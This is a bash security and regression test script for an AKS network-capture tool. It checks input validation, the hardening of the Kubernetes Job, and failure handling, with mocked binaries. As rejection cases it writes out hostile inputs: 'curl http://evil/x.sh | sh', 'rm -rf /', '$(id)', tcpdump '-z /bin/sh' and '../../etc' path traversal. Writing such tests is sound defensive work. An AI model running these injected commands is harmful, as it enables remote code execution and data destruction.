#!/usr/bin/env bash
# Security and runtime regression tests for aks-network-capture.
#
# Proves the command-injection class is neutralized: malicious --tcpdump-filter and
# out-of-range inputs are rejected during validation, BEFORE any kubectl call — so
# this runs in CI with no cluster. Mocked runtime checks also prove the Job uses one
# output filesystem and propagates tcpdump/archive failures without a success bundle.
set -u

SCRIPTS="$(cd "$(dirname "$0")/../../../skills/aks-network-capture/scripts" && pwd)"
CREATE_SCRIPT="$SCRIPTS/create-capture.sh"
RUN_SCRIPT="$SCRIPTS/run-capture.sh"
RETRIEVE_SCRIPT="$SCRIPTS/retrieve-captures.sh"
TEST_ROOT="$(mktemp -d)"
REAL_TAR="$(command -v tar)"
fails=0
pass() { echo "  ok: $1"; }
fail() { echo "  FAIL: $1" >&2; fails=$((fails+1)); }
cleanup() { rm -rf "$TEST_ROOT"; }
trap cleanup EXIT

# Case must be REJECTED (non-zero exit) without reaching kubectl.
reject() {
  local desc="$1"; shift
  if out="$("$CREATE_SCRIPT" "$@" 2>&1)"; then
    fail "$desc - script accepted a malicious/invalid input"
  else
    case "$out" in
      *"disallowed characters"*|*"flag tokens"*|*"must be"*|*"too long"*|*"too large"*|*"required"*)
        pass "$desc" ;;
      *) fail "$desc - rejected, but not by input validation (got: ${out%%$'\n'*})" ;;
    esac
  fi
}

assert_contains() {
  local desc="$1" pattern="$2" file="$3"
  if grep -Fq -- "$pattern" "$file"; then pass "$desc"; else fail "$desc"; fi
}

assert_not_contains() {
  local desc="$1" pattern="$2" file="$3"
  if grep -Fq -- "$pattern" "$file"; then fail "$desc"; else pass "$desc"; fi
}

echo "== aks-network-capture injection tests =="

reject "shell metacharacters in filter" \
  --name t --tcpdump-filter "udp port 53'; curl http://evil/x.sh | sh; echo '"
reject "command substitution in filter" \
  --name t --tcpdump-filter 'tcp port 80 $(id)'
reject "backtick in filter" \
  --name t --tcpdump-filter 'tcp port 80 `reboot`'
reject "tcpdump -z postrotate-command RCE flag" \
  --name t --tcpdump-filter "-z /bin/sh"
reject "semicolon chaining" \
  --name t --tcpdump-filter "port 53; rm -rf /"
reject "over-long duration" \
  --name t --duration 9999h
reject "non-numeric packet size" \
  --name t --packet-size "1;rm"
reject "invalid capture name" \
  --name "../../etc"
reject "overlong capture name" \
  --name aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

# Static assertion: no `eval` in command position in the runtime scripts.
if grep -h -vE '^[[:space:]]*#' "$CREATE_SCRIPT" "$RUN_SCRIPT" "$RETRIEVE_SCRIPT" \
  | grep -Eq '(^|[;&|]|then|do|else|;)[[:space:]]*eval[[:space:]]'; then
  fail "capture runtime uses eval"
else
  pass "no eval command in capture runtime"
fi

echo
echo "== rendered Job security tests =="

MOCK_BIN="$TEST_ROOT/bin"
MANIFEST="$TEST_ROOT/job.yaml"
mkdir -p "$MOCK_BIN"
cat > "$MOCK_BIN/kubectl" <<'EOF'
#!/bin/sh
case "${KUBECTL_MODE:-manifest}:$1:$2" in
  manifest:get:configmap)
    printf '%s' "runner"
    exit 0
    ;;
  manifest:apply:-f)
    cat > "$MANIFEST_OUT"
    ;;
  retrieval:get:jobs)
    printf '%s' "cleanup-test-node-one"
    ;;
  retrieval:get:job)
    printf '%s' "node-one"
    ;;
  retrieval:get:pods)
    printf '%s' "cleanup-test-node-one-pod"
    ;;
  retrieval:get:pod)
    printf '%s' "Succeeded"
    ;;
  retrieval:create:-f)
    cat >/dev/null
    printf '%s' "retrieve-cleanup-test-node-one-abc12"
    ;;
  retrieval:wait:*)
    exit 23
    ;;
  retrieval:delete:*)
    printf '%s\n' "$*" >> "$DELETE_LOG"
    ;;
  *)
    echo "unexpected kubectl call: $*" >&2
    exit 97
    ;;
esac
EOF
chmod +x "$MOCK_BIN/kubectl"

if KUBECTL_MODE=manifest MANIFEST_OUT="$MANIFEST" PATH="$MOCK_BIN:$PATH" \
  "$CREATE_SCRIPT" --name render-test --node-names node-one --duration 5s \
  --tcpdump-filter "udp port 53" >/dev/null 2>&1; then
  pass "render capture Job without a cluster"
else
  fail "render capture Job without a cluster"
fi

assert_contains "digest-pinned MCR image" \
  "mcr.microsoft.com/containernetworking/retina-shell:v1.2.3@sha256:c7dfe8e0c0dc7fa28e4cfbad04ade270c3051c42a5495488d4d897b49fb3366f" "$MANIFEST"
assert_contains "capabilities are NET_ADMIN and NET_RAW only" \
  'add: ["NET_ADMIN", "NET_RAW"]' "$MANIFEST"
assert_contains "dedicated output hostPath uses DirectoryOrCreate" \
  'hostPath: { path: "/var/log/aks-network-captures", type: DirectoryOrCreate }' "$MANIFEST"
assert_contains "output hostPath is mounted at the capture path" \
  'mountPath: "/var/log/aks-network-captures"' "$MANIFEST"
assert_contains "fixed capture runner is invoked without shell -c" \
  'command: ["/bin/sh", "/capture-scripts/run-capture.sh"]' "$MANIFEST"
assert_contains "setup deploys the fixed capture runner" \
  '--from-file=run-capture.sh=' "$SCRIPTS/setup-capture-configmap.sh"
assert_contains "BPF expression is passed through one env value" \
  'name: PCAP_FILTER, value: "udp port 53"' "$MANIFEST"
assert_not_contains "no SYS_ADMIN capability" "SYS_ADMIN" "$MANIFEST"
assert_not_contains "no SYS_CHROOT capability" "SYS_CHROOT" "$MANIFEST"
assert_not_contains "no hostPID" "hostPID:" "$MANIFEST"
assert_not_contains "no privileged container" "privileged: true" "$MANIFEST"
assert_not_contains "no node-root mount" "mountPath: /host" "$MANIFEST"
assert_not_contains "no chroot command" "chroot" "$MANIFEST"
assert_not_contains "no interactive flags" "-it" "$MANIFEST"

filter_count="$(grep -Fc 'udp port 53' "$MANIFEST")"
if [ "$filter_count" -eq 1 ]; then
  pass "BPF expression is absent from command text"
else
  fail "BPF expression is absent from command text"
fi

echo
echo "== capture runtime regression tests =="

cat > "$MOCK_BIN/tcpdump" <<'EOF'
#!/bin/sh
if [ "${1:-}" = "-d" ]; then
  exit 0
fi
if [ "${TCPDUMP_FAIL:-0}" -eq 1 ]; then
  exit 42
fi
output=""
while [ "$#" -gt 0 ]; do
  if [ "$1" = "-w" ]; then
    shift
    output="$1"
  fi
  shift
done
[ -n "$output" ] || exit 98
if [ "${TCPDUMP_EMPTY:-0}" -eq 1 ]; then
  : > "$output"
else
  printf 'pcap-data' > "$output"
fi
EOF
cat > "$MOCK_BIN/timeout" <<'EOF'
#!/bin/sh
shift
"$@"
status=$?
[ "$status" -eq 0 ] || exit "$status"
if [ "${TIMEOUT_EXPIRED:-0}" -eq 1 ]; then
  exit 124
fi
EOF
cat > "$MOCK_BIN/tar" <<'EOF'
#!/bin/sh
if [ "${TAR_FAIL:-0}" -eq 1 ]; then
  exit 43
fi
exec "$REAL_TAR" "$@"
EOF
chmod +x "$MOCK_BIN/tcpdump" "$MOCK_BIN/timeout" "$MOCK_BIN/tar"

SUCCESS_DIR="$TEST_ROOT/success"
if success_out="$(PATH="$MOCK_BIN:$PATH" REAL_TAR="$REAL_TAR" TIMEOUT_EXPIRED=1 OUT_DIR="$SUCCESS_DIR" \
  NODE_NAME=node-one STAMP=20260807-120000 CAPTURE_DURATION=5 PACKET_SIZE=0 \
  PCAP_FILTER="udp port 53" "$RUN_SCRIPT" 2>&1)"; then
  pass "capture runner creates an archive in the mounted output directory"
else
  fail "capture runner creates an archive in the mounted output directory"
fi
SUCCESS_BUNDLE="$SUCCESS_DIR/capture-node-one-20260807-120000.tar.gz"
if [ -s "$SUCCESS_BUNDLE" ] \
  && "$REAL_TAR" -tzf "$SUCCESS_BUNDLE" | grep -q '^capture-node-one-20260807-120000\.pcap$'; then
  pass "archive contains the non-empty pcap"
else
  fail "archive contains the non-empty pcap"
fi
case "$success_out" in
  *"bundle: $SUCCESS_BUNDLE"*) pass "success is reported only after archive creation" ;;
  *) fail "success is reported only after archive creation" ;;
esac

TCPDUMP_FAIL_DIR="$TEST_ROOT/tcpdump-fail"
if tcpdump_fail_out="$(PATH="$MOCK_BIN:$PATH" REAL_TAR="$REAL_TAR" TCPDUMP_FAIL=1 \
  OUT_DIR="$TCPDUMP_FAIL_DIR" NODE_NAME=node-one STAMP=20260807-120001 \
  CAPTURE_DURATION=5 PACKET_SIZE=0 PCAP_FILTER="" "$RUN_SCRIPT" 2>&1)"; then
  fail "tcpdump failure fails the capture runner"
else
  pass "tcpdump failure fails the capture runner"
fi
case "$tcpdump_fail_out" in
  *"bundle:"*) fail "tcpdump failure does not print success" ;;
  *) pass "tcpdump failure does not print success" ;;
esac
if [ -e "$TCPDUMP_FAIL_DIR/capture-node-one-20260807-120001.tar.gz" ]; then
  fail "tcpdump failure does not create a bundle"
else
  pass "tcpdump failure does not create a bundle"
fi

EMPTY_PCAP_DIR="$TEST_ROOT/empty-pcap"
if empty_pcap_out="$(PATH="$MOCK_BIN:$PATH" REAL_TAR="$REAL_TAR" TIMEOUT_EXPIRED=1 TCPDUMP_EMPTY=1 \
  OUT_DIR="$EMPTY_PCAP_DIR" NODE_NAME=node-one STAMP=20260807-120003 \
  CAPTURE_DURATION=5 PACKET_SIZE=0 PCAP_FILTER="" "$RUN_SCRIPT" 2>&1)"; then
  fail "timeout without a non-empty pcap fails the capture runner"
else
  pass "timeout without a non-empty pcap fails the capture runner"
fi
case "$empty_pcap_out" in
  *"bundle:"*) fail "empty pcap does not print success" ;;
  *) pass "empty pcap does not print success" ;;
esac

TAR_FAIL_DIR="$TEST_ROOT/tar-fail"
if tar_fail_out="$(PATH="$MOCK_BIN:$PATH" REAL_TAR="$REAL_TAR" TAR_FAIL=1 \
  OUT_DIR="$TAR_FAIL_DIR" NODE_NAME=node-one STAMP=20260807-120002 \
  CAPTURE_DURATION=5 PACKET_SIZE=0 PCAP_FILTER="" "$RUN_SCRIPT" 2>&1)"; then
  fail "archive failure fails the capture runner"
else
  pass "archive failure fails the capture runner"
fi
case "$tar_fail_out" in
  *"bundle:"*) fail "archive failure does not print success" ;;
  *) pass "archive failure does not print success" ;;
esac
if [ -e "$TAR_FAIL_DIR/capture-node-one-20260807-120002.tar.gz" ]; then
  fail "archive failure does not leave a success bundle"
else
  pass "archive failure does not leave a success bundle"
fi

echo
echo "== retrieval cleanup regression test =="

DELETE_LOG="$TEST_ROOT/delete.log"
if KUBECTL_MODE=retrieval DELETE_LOG="$DELETE_LOG" PATH="$MOCK_BIN:$PATH" \
  "$RETRIEVE_SCRIPT" --name cleanup-test --workspace-dir "$TEST_ROOT/workspace" \
  >/dev/null 2>&1; then
  fail "retrieval wait failure remains attributable"
else
  pass "retrieval wait failure remains attributable"
fi
assert_contains "all retrieval pods are deleted by capture label after failure" \
  "delete pods -n default -l capture-id=cleanup-test,role=retrieval --ignore-not-found" "$DELETE_LOG"
assert_contains "capture Jobs are deleted after retrieval failure" \
  "delete jobs -n default -l capture-id=cleanup-test --ignore-not-found" "$DELETE_LOG"

echo
if [ "$fails" -eq 0 ]; then echo "All capture security and regression tests passed."; exit 0
else echo "$fails capture test(s) FAILED."; exit 1; fi
